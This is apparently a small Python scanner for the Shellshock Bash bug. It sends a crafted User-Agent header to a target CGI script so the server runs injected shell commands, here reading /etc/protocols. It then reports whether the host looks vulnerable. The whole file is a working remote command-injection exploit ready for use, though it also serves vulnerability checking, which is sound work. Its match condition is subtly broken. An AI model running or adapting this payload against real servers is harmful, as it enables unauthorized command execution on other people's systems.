__author__ = 'p' + 'f' + 'o' + 'x' + '[at]' + 'q' + 'u' + 'a' + 'l' + 'y' + 's' + '.' + 'com'
import requests
from bs4 import BeautifulSoup
import sys

## if not called with right params, exit
if (len(sys.argv)<=1):
    print ('Usage: %s <host> <port> <vulnerableCGI> <attackHost/IP>' % sys.argv[0])
    print ('Example: %s localhost 80 /cgi-bin/text.pl' % sys.argv[0])
    exit(0)

## Dict of payloads
user_agents = {1:'() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/protocols',
           }

## for each payload, launch request to check for shellshock
for each in user_agents:
    results = requests.get('http://' + sys.argv[1] + ':' + sys.argv[2] + sys.argv[3], headers={'User-Agent':user_agents[each]})
    soup = BeautifulSoup(results.text)
    match = str(soup.body.p)
    if (len(match)!= 0) or match != 'None' and 'tcp' in match:
        print ('Host: ' + sys.argv[1] + ':' + sys.argv[2] + sys.argv[3] + ' appears vulnerable!  Response receivd:'),
        print(match[314:700])
    else:
        print ('Host does not appear vulnerable')